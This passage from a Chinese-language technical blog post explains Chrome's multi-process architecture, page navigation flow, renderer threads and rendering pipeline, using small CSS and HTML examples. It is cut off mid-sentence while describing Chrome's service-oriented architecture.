个特点。</p><ol><li><p><strong>进程中的任意一线程执行出错，都会导致整个进程的崩溃。</strong></p></li><li><p><strong>线程之间共享进程中的数据。</strong></p></li><li><p><strong>当一个进程关闭之后，操作系统会回收进程所占用的内存。</strong></p><p>当一个进程退出时，操作系统会回收该进程所申请的所有资源；即使其中任意线程因为操作不当导致内存泄漏，当进程退出时，这些内存也会被正确回收。</p></li><li><p><strong>进程之间的内容相互隔离。</strong></p><p>进程隔离是为保护操作系统中进程互不干扰的技术，每一个进程只能访问自己占有的数据，也就避免出现进程 A 写入数据到进程 B 的情况。正是因为进程之间的数据是严格隔离的，所以一个进程如果崩溃了，或者挂起了，是不会影响到其他进程的。如果进程之间需要进行数据的通信，这时候，就需要使用用于<strong>进程间通信（IPC）的机制</strong>了。</p></li></ol><p>解决 <strong>不稳定</strong> 问题：</p><ul><li>由于进程是相互隔离的，所以当一个页面或者插件崩溃时，影响到的仅仅是当前的页面进程或者插件进程，并不会影响到浏览器和其他页面，这就完美地解决了页面或者插件的崩溃会导致整个浏览器崩溃，也就是不稳定的问题。</li></ul><p>解决<strong>不流畅</strong>问题：</p><ul><li>JavaScript 也是运行在渲染进程中的，所以即使 JavaScript 阻塞了渲染进程，影响到的也只是当前的渲染页面，而并不会影响浏览器和其他页面，因为其他页面的脚本是运行在它们自己的渲染进程中的。</li></ul><p>解决<strong>不安全</strong>问题：</p><ul><li>采用多进程架构的额外好处是可以使用安全沙箱，你可以把沙箱看成是操作系统给进程上了一把锁，沙箱里面的程序可以运行，但是不能在你的硬盘上写入任何数据，也不能在敏感位置读取任何数据，例如你的文档和桌面。Chrome 把插件进程和渲染进程锁在沙箱里面，这样即使在渲染进程或者插件进程里面执行了恶意程序，恶意程序也无法突破沙箱去获取系统权限。</li></ul><p><strong>进程</strong>：</p><ul><li><code>浏览器进程</code>：主要负责界面显示、用户交互、子进程管理，同时提供存储等功能。</li><li><code>渲染进程</code>：核心任务是将 HTML、CSS 和 JavaScript 转换为用户可以与之交互的网页，排版引擎 Blink 和 JavaScript 引擎 V8 都是运行在该进程中，默认情况下，Chrome 会为每个 Tab 标签创建一个渲染进程。出于安全考虑，渲染进程都是运行在沙箱模式下。</li><li>GPU 进程。其实，Chrome 刚开始发布的时候是没有 GPU 进程的。而 GPU 的使用初衷是为了实现 3D CSS 的效果，只是随后网页、Chrome 的 UI 界面都选择采用 GPU 来绘制，这使得 GPU 成为浏览器普遍的需求。最后，Chrome 在其多进程架构上也引入了 GPU 进程。</li><li><code>网络进程</code>：主要负责页面的网络资源加载，之前是作为一个模块运行在浏览器进程里面的，直至最近才独立出来，成为一个单独的进程。</li><li><code>插件进程</code>：主要是负责插件的运行，因插件易崩溃，所以需要通过插件进程来隔离，以保证插件进程崩溃不会对浏览器和页面造成影响。</li></ul><h5 id="页面加载的流程："><a href="#页面加载的流程：" class="headerlink" title="页面加载的流程："></a>页面加载的流程：</h5><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8c6004fc2f664f2186a727624ed39ae8~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><ol><li><p><strong><a href="https://link.juejin.cn/?target=https://github.com/skyline75489/what-happens-when-zh_CN%23g">用户输入url并回车</a>。浏览器进程</strong>会<a href="https://juejin.cn/post/7025956944028532743#heading-2">根据用户输入的信息判断</a>是搜索还是网址，如果是搜索内容，就将搜索内容+默认搜索引擎合成新的URL；如果用户输入的内容符合URL规则，<strong>浏览器进程</strong>就会根据URL协议，在这段内容上加上协议合成合法的URL。</p></li><li><p>浏览器导航栏显示loading状态，但是页面还是呈现之前的页面不变，因为新页面的响应数据还没有获得。</p></li><li><p><strong>浏览器进程</strong>构建请求行信息，通过进程间通信（IPC）把url请求发送给<strong>网络进程</strong>。</p></li><li><p><strong>网络进程</strong>接收到url请求后<a href="https://juejin.cn/post/7025956944028532743#heading-5">检查本地缓存是否缓存了该请求资源</a>，如果有则将该资源返回给<strong>浏览器进程</strong>。</p></li><li><p>如果没有，<strong>网络进程</strong>向web服务器发起http请求（网络请求），请求流程如下：</p><ol><li><a href="https://juejin.cn/post/7025956944028532743#heading-12">进行DNS解析，获取服务器ip地址</a>（先查找DNS缓存，再发起DNS网络请求）</li><li><a href="https://juejin.cn/post/7025956944028532743#heading-19">利用ip地址和服务器建立tcp连接</a>（TCP三次握手建立的连接并不是真实的物理连接，而是虚连接，连接的本质就是在客户端与服务端开辟本次连接所需要的资源（内存、进程等））</li><li><a href="https://juejin.cn/post/7025956944028532743#heading-59">完成构建请求信息并发送请求</a>（调用Socket利用TCP通过三次握手连接建立后，之前准备好的HTTP请求报文被送入发送队列，接下来就交给了TCP完成后续过程）</li><li>服务器响应后，<strong>网络进程</strong>接收响应头和响应信息，并解析响应内容</li></ol></li><li><p><strong>网络进程</strong>解析响应流程：</p><ol><li>检查状态码，如果是301&#x2F;302，则需要重定向，从Location自动中读取地址，重新进行第三步，如果是200，则继续处理请求。</li><li>检查响应类型Content-Type，如果是字节流类型，则将该请求提交给下载管理器，该导航流程结束，不再进行后续的渲染，如果是html等资源则将其转发给<strong>浏览器进程</strong>。</li></ol></li><li><p><strong>浏览器进程</strong>接收到网络进程的响应头数据之后，检查当前url是否和<strong>之前打开的渲染进程</strong>根域名是否相同，如果相同，则复用原来的进程，如果不同，则<strong>开启新的渲染进程</strong>（这个文章后面还会展开说）。</p></li><li><p><strong>渲染进程</strong>准备好后，<strong>浏览器进程</strong>发送<code>CommitNavigation</code>消息到<strong>渲染进程</strong>，发送<code>CommitNavigation</code>时会携带响应头、等基本信息。<strong>渲染进程</strong>接收到消息和<strong>网络进程</strong>建立传输数据的“管道”。</p></li><li><p><strong>渲染进程</strong>接收完数据后，向<strong>浏览器进程</strong>发送“确认提交”。</p></li><li><p><strong>浏览器进程</strong>接收到确认消息后更新浏览器界面状态：安全、地址栏url、前进后退的历史状态、更新web页面。</p></li></ol><p><strong>浏览器渲染进程的线程</strong>：</p><p>（1）GUI渲染线程</p><p>负责渲染浏览器页面，解析HTML、CSS，构建DOM树、构建CSSOM树、构建渲染树和绘制页面；当界面需要重绘或由于某种操作引发回流时，该线程就会执行。 注意：GUI渲染线程和JS引擎线程是互斥的，当JS引擎执行时GUI线程会被挂起，GUI更新会被保存在一个队列中等到JS引擎空闲时立即被执行。</p><p>（2）JS引擎线程</p><p>JS引擎线程也称为JS内核，负责处理Javascript脚本程序，解析Javascript脚本，运行代码；JS引擎线程一直等待着任务队列中任务的到来，然后加以处理，一个Tab页中无论什么时候都只有一个JS引擎线程在运行JS程序； 注意：GUI渲染线程与JS引擎线程的互斥关系，所以如果JS执行的时间过长，会造成页面的渲染不连贯，导致页面渲染加载阻塞。</p><p>（3）事件触发线程</p><p>事件触发线程属于浏览器而不是JS引擎，用来控制事件循环；当JS引擎执行代码块如setTimeOut时（也可是来自浏览器内核的其他线程,如鼠标点击、AJAX异步请求等），会将对应任务添加到事件触发线程中；当对应的事件符合触发条件被触发时，该线程会把事件添加到待处理队列的队尾，等待JS引擎的处理； 注意：由于JS的单线程关系，所以这些待处理队列中的事件都得排队等待JS引擎处理（当JS引擎空闲时才会去执行）；</p><p>（4）定时器触发进程</p><p>定时器触发进程即setInterval与setTimeout所在线程；浏览器定时计数器并不是由JS引擎计数的，因为JS引擎是单线程的，如果处于阻塞线程状态就会影响记计时的准确性；因此使用单独线程来计时并触发定时器，计时完毕后，添加到事件队列中，等待JS引擎空闲后执行，所以定时器中的任务在设定的时间点不一定能够准时执行，定时器只是在指定时间点将任务添加到事件队列中； 注意：W3C在HTML标准中规定，定时器的定时时间不能小于4ms，如果是小于4ms，则默认为4ms。</p><p>（5）异步http请求线程</p><p>●XMLHttpRequest连接后通过浏览器新开一个线程请求； ●检测到状态变更时，如果设置有回调函数，异步线程就产生状态变更事件，将回调函数放入事件队列中，等待JS引擎空闲后执行；</p><h5 id="完整的渲染流程"><a href="#完整的渲染流程" class="headerlink" title="完整的渲染流程"></a>完整的渲染流程</h5><p><strong>一旦文档被提交，渲染进程便开始页面解析和子资源加载了。</strong> 为了能更好地理解下文，你可以先结合下图快速抓住 HTML、CSS 和 JavaScript 的含义：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9e8dbd186b604834a56069ad23f66225~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>由于渲染机制过于复杂，所以渲染模块在执行过程中会被划分为很多子阶段，输入的 HTML 经过这些子阶段，最后输出像素。我们把这样的一个处理流程叫做渲染流水线，其大致流程如下图所示：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/63a9b7a52df041da922e45b0a18d62ee~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>按照渲染的时间顺序，流水线可分为如下几个子阶段：<strong>构建 DOM 树、样式计算、布局阶段、分层、绘制、分块、光栅化和合成。</strong></p><p>过程很多，但是我们都可以从下面三个方面去理解每一个阶段：</p><ul><li>开始每个子阶段都有其<strong>输入的内容</strong></li><li>然后每个子阶段有其<strong>处理过程</strong></li><li>最终每个子阶段会生成<strong>输出内容</strong></li></ul><p>理解了这三部分内容，能让你更加清晰地理解每个子阶段。</p><p><strong>构建DOM树</strong></p><p>因为浏览器无法直接理解和使用 HTML，所以需要将 HTML 转换为浏览器能够理解的结构——DOM 树。何为DOM树，可以参考下图加以理解：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/85bca2eba7f74892856a29a1b7e42d0d~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>从图中可以看出，构建 DOM 树的输入内容是一个非常简单的 HTML 文件，然后经由 HTML 解析器解析，最终输出树状结构的 DOM。同样我们可以在控制台中的<code>Console</code>标签中输入<code>document</code>后回车，这样我们也能看到一个完整的DOM树。</p><p>DOM 和 HTML 内容几乎是一样的，但是和 HTML 不同的是，DOM 是保存在内存中树状结构，可以通过 JavaScript 来查询或修改其内容。</p><p><strong>样式计算</strong></p><p>样式计算的目的是为了计算出 DOM 节点中每个元素的具体样式，这个阶段大体可分为三步来完成。</p><ol><li>把 CSS 转换为浏览器能够理解的结构</li></ol><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/cabb65ba8d0b46d18055fb0f09a1c5e0~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>从图中可以看出，CSS 样式来源主要有三种：</p><ul><li><p>通过 link 引用的外部 CSS 文件</p></li><li><style>标记内的 CSS</li><li><p>元素的 style 属性内嵌的 CSS</p></li></ul><p>和 HTML 文件一样，浏览器也是无法直接理解这些纯文本的 CSS 样式，所以<strong>当渲染引擎接收到 CSS 文本时，会执行一个转换操作，将 CSS 文本转换为浏览器可以理解的结构——styleSheets</strong>。</p><p>为了加深理解，你可以在 Chrome 控制台中查看其结构，只需要在控制台中输入 <code>document.styleSheets</code>，然后就看到如下图所示的结构：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bf663f523fe64e1a9a0deec4ac012f6b~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>从图中可以看出，这个样式表包含了很多种样式，已经把那三种来源的样式都包含进去了，并且该结构同时具备了查询和修改功能，这会为后面的样式操作提供基础。</p><ol start="2"><li>转换样式表中的属性值，使其标准化</li></ol><p>现在我们已经把现有的 CSS 文本转化为浏览器可以理解的结构了，那么<strong>接下来就要对其进行属性值的标准化操作</strong>。</p><p>要理解什么是属性值标准化，你可以看下面这样一段 CSS 文本：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css">css<br>复制代码<span class="hljs-selector-tag">body</span> &#123; <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2em</span> &#125;<br><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:blue;&#125;<br><span class="hljs-selector-tag">span</span> &#123;<span class="hljs-attribute">display</span>: none&#125;<br><span class="hljs-selector-tag">div</span> &#123;<span class="hljs-attribute">font-weight</span>: bold&#125;<br><span class="hljs-selector-tag">div</span> <span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:green;&#125;<br><span class="hljs-selector-tag">div</span> &#123;<span class="hljs-attribute">color</span>:red; &#125;<br></code></pre></td></tr></table></figure><p>可以看到上面的 CSS 文本中有很多属性值，如 2em、blue、bold，这些类型数值不容易被渲染引擎理解，所以<strong>需要将所有值转换为渲染引擎容易理解的、标准化的计算值</strong>，这个过程就是属性值标准化。下图就是标准化的结果：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/241469942d794a6e9ba786c4e068fa5a~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><ol start="3"><li>计算出 DOM 树中每个节点的具体样式</li></ol><p>现在样式的属性已被标准化了，接下来就需要计算 DOM 树中每个节点的样式属性了，<strong>这就涉及到 CSS 的继承规则和层叠规则了。</strong></p><p>首先是 CSS 继承。<strong>CSS 继承就是每个 DOM 节点都包含有父节点的样式。</strong> 这么说可能有点抽象，我们可以结合具体例子，看下面这样一张样式表是如何应用到 DOM 节点上的。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css">css<br>复制代码<span class="hljs-selector-tag">body</span> &#123; <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span> &#125;<br><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:blue;&#125;<br><span class="hljs-selector-tag">span</span>  &#123;<span class="hljs-attribute">display</span>: none&#125;<br><span class="hljs-selector-tag">div</span> &#123;<span class="hljs-attribute">font-weight</span>: bold;<span class="hljs-attribute">color</span>:red&#125;<br><span class="hljs-selector-tag">div</span>  <span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:green;&#125;<br></code></pre></td></tr></table></figure><p>这张样式表最终应用到 DOM 节点的效果如下图所示：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/cb9b69a5f40d4f87bcad5154128e0c7e~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>从图中可以看出，所有子节点都继承了父节点样式。比如 body 节点的 <code>font-size</code> 属性是 20，那 body 节点下面的所有节点的 <code>font-size</code> 都等于 20。</p><p><strong>这里需要特别提下 UserAgent 样式，它是浏览器提供的一组默认样式，如果你不提供任何样式，默认使用的就是 UserAgent 样式。</strong></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/dae336e8414e444c92e1864453c17108~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>样式计算过程中的第二个规则是样式层叠。<strong>层叠是 CSS 的一个基本特征，它是一个定义了如何合并来自多个源的属性值的算法。它在 CSS 处于核心地位，CSS 的全称“层叠样式表”正是强调了这一点。</strong></p><p>总之，样式计算阶段的目的是为了计算出 DOM 节点中每个元素的具体样式，在计算过程中需要遵守 CSS 的继承和层叠两个规则。这个阶段最终输出的内容是每个 DOM 节点的样式，并被保存在 <code>ComputedStyle</code> 的结构内。</p><p><strong>布局阶段</strong></p><p>现在，我们有 DOM 树和 DOM 树中元素的样式，但这还不足以显示页面，因为我们还不知道 DOM 元素的几何位置信息。<strong>那么接下来就需要计算出 DOM 树中可见元素的几何位置，我们把这个计算过程叫做布局。</strong></p><p><code>Chrome</code> 在布局阶段需要完成两个任务：<strong>创建布局树和布局计算</strong>。</p><ol><li>创建布局树</li></ol><p>DOM 树还含有很多不可见的元素，比如 <code>head</code> 标签，还有使用了 <code>display:none</code> 属性的元素。所以在显示之前，还要额外地构建一棵只包含可见元素布局树。</p><p>我们结合下图来看看布局树的构造过程：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/05f42c09057d48a397beb75d5ed83511~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>从上图可以看出，DOM 树中所有不可见的节点都没有包含到布局树中。</p><p>为了构建布局树，浏览器大体上完成了下面这些工作：</p><ul><li>遍历 DOM 树中的所有可见节点，并把这些节点加到布局树中</li><li>而不可见的节点会被布局树忽略掉，如 head 标签下面的全部内容，再比如 <code>body.p.span</code> 这个元素，因为它的属性包含 <code>dispaly:none</code>，所以这个元素也没有被包进布局树</li></ul><ol start="2"><li>布局计算</li></ol><p>现在我们有了一棵完整的布局树。那么接下来，就要计算布局树节点的坐标位置。</p><p>在执行布局操作的时候，会把布局运算的结果重新写回布局树中，<strong>所以布局树既是输入内容也是输出内容</strong>，这是布局阶段一个不合理的地方，因为在布局阶段并没有清晰地将输入内容和输出内容区分开来。</p><p>针对这个问题，Chrome 团队正在重构布局代码，下一代布局系统叫 LayoutNG，试图更清晰地分离输入和输出，从而让新设计的布局算法更加简单。</p><p><strong>分层</strong></p><p>到这里我们先总结一下前三个阶段：</p><p>在 HTML 页面内容被提交给渲染引擎之后，渲染引擎首先将 HTML 解析为浏览器可以理解的 DOM；然后根据 CSS 样式表，计算出 DOM 树所有节点的样式；接着又计算每个元素的几何坐标位置，并将这些信息保存在布局树中。</p><p>现在我们有了布局树，而且每个元素的具体位置信息都计算出来了，那么接下来是不是就要开始着手绘制页面了？</p><p>答案依然是否定的。</p><p>因为页面中有很多复杂的效果，如一些复杂的 3D 变换、页面滚动，或者使用 <code>z-index</code> 做 z 轴排序等，为了更加方便地实现这些效果，<strong>渲染引擎还需要为特定的节点生成专用的图层，并生成一棵对应的图层树（LayerTree）。</strong> 如果你熟悉 PS，相信你会很容易理解图层的概念，正是这些图层叠加在一起构成了最终的页面图像。</p><p>要想直观地理解什么是图层，你可以打开 Chrome 的“开发者工具”，选择“Layers”标签，就可以可视化页面的分层情况。</p><p>现在你知道了浏览器的页面实际上被分成了很多图层，这些图层叠加后合成了最终的页面。下面我们再来看看这些图层和布局树节点之间的关系，如文中图所示：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fd24059335a6465ea1613451a7a9eead~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>通常情况下，<strong>并不是布局树的每个节点都包含一个图层，如果一个节点没有对应的层，那么这个节点就从属于父节点的图层</strong>。如上图中的 <code>span</code> 标签没有专属图层，那么它们就从属于它们的父节点图层。但不管怎样，最终每一个节点都会直接或者间接地从属于一个层。</p><p>那么需要满足什么条件，渲染引擎才会为特定的节点创建新的图层呢？通常满足下面两点中任意一点的元素就可以被提升为单独的一个图层。</p><p><strong>第一点，拥有层叠上下文属性的元素会被提升为单独的一层。</strong></p><p>页面是个二维平面，但是层叠上下文能够让 HTML 元素具有三维概念，这些 HTML 元素按照自身属性的优先级分布在垂直于这个二维平面的 z 轴上。你可以结合下图来直观感受下：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fda8eea299184b9aab380e42279a8c9c~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>从图中可以看出，明确定位属性的元素、定义透明属性的元素、使用 CSS 滤镜的元素等，都拥有层叠上下文属性。</p><p><strong>第二点，需要剪裁（clip）的地方也会被创建为图层。</strong></p><p>不过首先你需要了解什么是剪裁，结合下面的 HTML 代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html">html<br>复制代码<br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">      <span class="hljs-selector-tag">div</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">width</span>: <span class="hljs-number">200</span>;</span><br><span class="language-css">            <span class="hljs-attribute">height</span>: <span class="hljs-number">200</span>;</span><br><span class="language-css">            <span class="hljs-attribute">overflow</span>:auto;</span><br><span class="language-css">            <span class="hljs-attribute">background</span>: gray;</span><br><span class="language-css">        &#125; </span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> &gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>所以元素有了层叠上下文的属性或者需要被剪裁，那么就会被提升成为单独一层，你可以参看下图：<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>从上图我们可以看到，document层上有A和B层，而B层之上又有两个图层。这些图层组织在一起也是一颗树状结构。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>图层树是基于布局树来创建的，为了找出哪些元素需要在哪些层中，渲染引擎会遍历布局树来创建层树（Update LayerTree）。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在这里我们把 div 的大小限定为 200 * 200 像素，而 <code>div</code> 里面的文字内容比较多，文字所显示的区域肯定会超出 200 * 200 的面积，这时候就产生了剪裁，渲染引擎会把裁剪文字内容的一部分用于显示在 <code>div</code> 区域，下图是运行时的执行结果：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a5e6edd290574f6f994455e7c968940f~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>出现这种裁剪情况的时候，渲染引擎会为文字部分单独创建一个层，如果出现滚动条，滚动条也会被提升为单独的层。你可以参考下图：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/4a19ec877e3b47fb8440746f72885f15~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>所以说，元素有了层叠上下文的属性或者需要被剪裁，满足其中任意一点，就会被提升成为单独一层。</p><p><strong>图层绘制</strong></p><p>在完成图层树的构建之后，渲染引擎会对图层树中的每个图层进行绘制，那么接下来我们看看渲染引擎是怎么实现图层绘制的。</p><p>试想一下，如果给你一张纸，让你先把纸的背景涂成蓝色，然后在中间位置画一个红色的圆，最后再在圆上画个绿色三角形。你会怎么操作呢？</p><p>通常，你会把你的绘制操作分解为三步：</p><ol><li>绘制蓝色背景</li><li>在中间绘制一个红色的圆</li><li>再在圆上绘制绿色三角形</li></ol><p>渲染引擎实现图层的绘制与之类似，会把一个图层的绘制拆分成很多小的<strong>绘制指令</strong>，然后再把这些指令按照顺序组成一个待绘制列表，如下图所示：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/08b22ddf1964485c830b63a37b4bbcf5~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>从图中可以看出，绘制列表中的指令其实非常简单，就是让其执行一个简单的绘制操作，比如绘制粉色矩形或者黑色的线等。而绘制一个元素通常需要好几条绘制指令，因为每个元素的背景、前景、边框都需要单独的指令去绘制。所以在图层绘制阶段，输出的内容就是这些待绘制列表。</p><p>你也可以打开“开发者工具”的<code>Layers</code>标签，选择<code>document</code>层，来实际体验下绘制列表，如下图所示：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b8405bd2dbb54e1391fbf87a2492097e~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>在该图中，区域 1 就是 document 的绘制列表，拖动区域 2 中的进度条可以重现列表的绘制过程。</p><p><strong>栅格化操作</strong></p><p>绘制列表只是用来记录绘制顺序和绘制指令的列表，而实际上绘制操作是由渲染引擎中的合成线程来完成的。你可以结合下图来看下渲染主线程和合成线程之间的关系：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/582e09ed4aab40c5bcddf1ec05b10d7b~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>如上图所示，当图层的绘制列表准备好之后，主线程会把该绘制列表提交（commit）给合成线程，那么接下来合成线程是怎么工作的呢？</p><p>那我们得先来看看什么是视口，<strong>屏幕上页面的可见区域就叫视口（ViewPort）</strong>，通俗点来说就是，一个页面可能很大，但是用户只能看到其中的一部分，我们把用户可以看到的这个部分叫做视口。</p><p>在有些情况下，有的图层可以很大，比如有的页面你使用滚动条要滚动好久才能滚动到底部，但是通过视口，用户只能看到页面的很小一部分，所以在这种情况下，要绘制出所有图层内容的话，就会产生太大的开销，而且也没有必要。</p><p>基于这个原因，合成线程会将图层划分为图块（tile），这些图块的大小通常是 256x256 或者 512x512，如下图所示：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/079265826ab141ea9d6d746c6fd45402~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>然后<strong>合成线程会按照视口附近的图块来优先生成位图，实际生成位图的操作是由栅格化来执行的。所谓栅格化，是指将图块转换为位图。而图块是栅格化执行的最小单位。</strong> 渲染进程维护了一个栅格化的线程池，所有的图块栅格化都是在线程池内执行的，运行方式如下图所示：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/225fb615e24d4577917460514604bb0f~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>通常，栅格化过程都会使用 GPU 来加速生成，使用 GPU 生成位图的过程叫快速栅格化，或者 GPU 栅格化，生成的位图被保存在 GPU 内存中。</p><p>相信你还记得，GPU 操作是运行在 GPU 进程中，如果栅格化操作使用了 GPU，那么最终生成位图的操作是在 GPU 中完成的，这就涉及到了跨进程操作。具体形式你可以参考下图：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8b6e16bf08df423bac9719b9efce4ab0~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>从图中可以看出，渲染进程把生成图块的指令发送给 GPU，然后在 GPU 中执行生成图块的位图，并保存在 GPU 的内存中。</p><p><strong>合成和显示</strong></p><p>一旦所有图块都被光栅化，合成线程就会生成一个绘制图块的命令<code>DrawQuad</code>，然后将该命令提交给浏览器进程。</p><p>浏览器进程里面有一个叫 <code>viz</code> 的组件，用来接收合成线程发过来的 <code>DrawQuad</code> 命令，然后根据 <code>DrawQuad</code> 命令，将其页面内容绘制到内存中，最后再将内存显示在屏幕上。</p><p>到这里，经过这一系列的阶段，编写好的 HTML、CSS、JavaScript 等文件，经过浏览器就会显示出漂亮的页面了。</p><p><strong>渲染流水线大总结</strong></p><p>好了，我们现在已经分析完了整个渲染流程，从 HTML 到 DOM、样式计算、布局、图层、绘制、光栅化、合成和显示。下面我用一张图来总结下这整个渲染流程：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/748f7f523d104f7e93f5c5523e6f2e13~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>结合上图，一个完整的渲染流程大致可总结为如下：</p><ol><li>渲染进程将 HTML 内容转换为能够读懂的 <strong>DOM树</strong> 结构。</li><li>渲染引擎将 CSS 样式表转化为浏览器可以理解的 <strong>styleSheets</strong>，计算出 DOM 节点的样式。</li><li>创建<strong>布局树</strong>，并计算元素的布局信息。</li><li>对布局树进行分层，并生成<strong>分层树</strong>。</li><li>为每个图层生成<strong>绘制列表</strong>，并将其提交到合成线程。</li><li>合成线程将图层分成<strong>图块</strong>，并在<strong>光栅化线程</strong>池中将图块转换成位图。</li><li>合成线程发送绘制图块命令 <code>DrawQuad</code> 给浏览器进程。</li><li>浏览器进程根据 <code>DrawQuad</code> 消息生成页面，并显示到显示器上。</li></ol><h5 id="面向服务的架构"><a href="#面向服务的架构" class="headerlink" title="面向服务的架构"></a>面向服务的架构</h5><p>在 2016 年，Chrome 官方团队使用“<strong>面向服务的架构</strong>”（Services Oriented Architecture，简称 <strong>SOA</strong>）的思想设计了新的 Chrome 架构。也就是说 Chrome 整体架构会朝向现代操作系统所采用的“面向服务的架构” 方向发展，原来的各种模块会被重构成独立的服务（Service），每个服务（Service）都可以在独立的进程中运行，访问服务（Service）必须使用定义好的接口，通过 IPC 来通信，从而构建<strong>一个更内聚、松耦合、易于维护和扩展的系统</strong>，更好实现 Chrome 简单、稳定、高速、安全的目标。</p><p>Chrome 最终要把 UI、数据库、文件、设备、网络等模块重构为基础服务，类似操作系统底层服务，下面是 Chrome“面向服务的架构”的进程模型图：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2bd9b0dd3ffd476fab397a7a1b40b7ee~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="img"></p><p>同时 Chrome 还提供灵活的弹性架构，在强大性能设备上会以多进程的方式运行基础服务，但是如果在资源受限的设备上（如下图），Chrome 